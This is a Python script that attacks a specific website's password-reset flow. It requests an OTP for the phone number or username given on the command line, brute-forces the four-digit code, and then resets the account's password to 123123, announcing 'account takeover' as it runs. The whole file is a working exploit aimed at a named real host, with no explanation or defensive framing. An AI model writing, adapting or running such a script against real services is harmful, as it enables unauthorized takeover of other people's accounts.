import requests, sys
from bs4 import BeautifulSoup
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def open_browser():
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36'
    }
    browser = requests.get('https://qa.game-on.io/reset-password', verify=False, headers=headers)
    return browser
    

def pass_brute(otp, browser):
    session = requests.Session()
    URL = 'https://qa.game-on.io/resetverify'
    # http_proxy = {
    #     'http': '127.0.0.1:8080',
    #     'https': '127.0.0.1:8080'
    # }
    cookies = browser.cookies.get_dict()
    cookies = {'XSRF-TOKEN': cookies['XSRF-TOKEN'],'gameon_session': cookies['gameon_session']}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36'
        }
    payload = {
        '_token': get_value(browser.content, '_token'),
        'code1': str(otp)[0:1],
        'code2': str(otp)[1:2],
        'code3': str(otp)[2:3],
        'code4': str(otp)[3:4],
    }
    response = session.post(url=URL, data=payload , cookies = cookies,
            verify=False, headers=headers)
    return response

def reset_pass(number):
    session = requests.Session()
    URL = 'https://qa.game-on.io/reset-password'
    browser = open_browser()
    cookies = browser.cookies.get_dict()
    cookies = {'XSRF-TOKEN': cookies['XSRF-TOKEN'],'gameon_session': cookies['gameon_session'] }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36'
    }
    payload = {
        '_token': get_value(browser.content, '_token'),
        'username': number
    }
    response = session.post(url=URL, data=payload,verify=False, headers=headers, cookies = cookies)
    if response.status_code == 200:
        return True, response


def set_newpass(userid, token, browser):
    URL = 'https://qa.game-on.io/new-password'
    cookies = {'XSRF-TOKEN': browser['XSRF-TOKEN'],
               'gameon_session': browser['gameon_session']}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36'
    }
    payload = {
        '_token': token,
        'userid': userid,
        'password': 123123,
        'password_confirmation': 123123
    }
    response = requests.post(url=URL, data=payload,
                            verify=False, headers=headers, cookies = cookies)
    if response.status_code == 200:
        print('[+] Password has changed successfully. New pass: 123123')

def get_value(sesion, name):
    soup = BeautifulSoup(sesion, 'html.parser')
    inputid = soup.find("input", {'name': name})
    return inputid['value']

def magic(browser):
    for otp in range(1111, 9999):
        response = pass_brute(otp, browser)
        if response.url == 'https://qa.game-on.io/new-password':
            print("[+] OTP Found! : ", otp)
            userid = get_value(response.content, 'userid')
            token = get_value(response.content, '_token')
            cookies = response.cookies.get_dict()
            print("[+] Setting new password ...")
            set_newpass(userid, token, cookies)
            break

if __name__ == '__main__':
    if len(sys.argv) == 2:
        print("[+] Trying to send OTP.")
        reset = reset_pass(sys.argv[1])
        if(reset[0]):
            print("[+] Sending OTP successfull to ", sys.argv[1])
            print("[+] Time to account takeover. It will take more or less 5 minutes.")
            magic(reset[1])
    else:
        print('Please pass an arugemnt!')
        
